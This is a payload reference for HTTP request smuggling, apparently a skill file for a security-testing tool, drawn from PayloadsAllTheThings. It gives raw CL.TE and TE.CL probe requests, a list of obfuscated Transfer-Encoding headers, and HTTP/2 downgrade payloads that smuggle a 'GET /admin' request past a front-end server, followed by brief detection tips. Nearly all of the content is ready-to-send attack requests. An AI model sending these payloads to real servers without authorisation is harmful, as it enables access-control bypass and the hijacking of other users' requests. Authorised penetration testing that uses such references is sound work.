---
description: CL.TE, TE.CL, TE.TE obfuscation, HTTP/2 downgrade
skill: request-smuggling
source: PayloadsAllTheThings — Request Smuggling
source_revision: 3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a
source_license: MIT; see THIRD_PARTY_NOTICES.md
---

# HTTP Request Smuggling Payloads

> Source: PayloadsAllTheThings — Request Smuggling

## CL.TE (Front-end uses Content-Length, Back-end uses Transfer-Encoding)

### Basic Detection

```http
POST / HTTP/1.1
Host: target.example
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

## TE.CL (Front-end uses Transfer-Encoding, Back-end uses Content-Length)

### Basic Detection

```http
POST / HTTP/1.1
Host: target.example
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

## TE.TE Obfuscation (Both Support TE, One Can Be Confused)

Obfuscate `Transfer-Encoding` so one server ignores it:

```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked                (space before colon)
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
 Transfer-Encoding: chunked                (leading space)
X: X[\n]Transfer-Encoding: chunked         (header injection)
Transfer-Encoding\n: chunked               (newline before colon)
Transfer-Encoding: chunk                   (truncated)
```

- [ ] Mixed case: `TrAnSfEr-EnCoDiNg: chunked`
- [ ] Line folding: `Transfer-Encoding:\n chunked`

## HTTP/2 Downgrade Smuggling

HTTP/2 request converted to HTTP/1.1 by the front-end:

```
:method GET
:path /
:authority target.example
header: ignored\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.example
```

### H2.CL (HTTP/2 with Content-Length Desync)

```
:method POST
:path /
:authority target.example
content-length: 0

GET /admin HTTP/1.1
Host: target.example

```

### H2.TE (HTTP/2 with Transfer-Encoding Injection)

```
:method POST
:path /
:authority target.example
transfer-encoding: chunked

0

GET /admin HTTP/1.1
Host: target.example

```

## Detection Tips

```
1. Send CL.TE probe — if response is delayed or different, likely vulnerable
2. Send TE.CL probe (sends a smuggled prefix: operator approval first, per request-smuggling Safety) — look for 400/405 errors on the "smuggled" portion
3. Test with timing: smuggled SLEEP-like behavior
4. Always test HTTP/2 downgrade if target uses H2
```
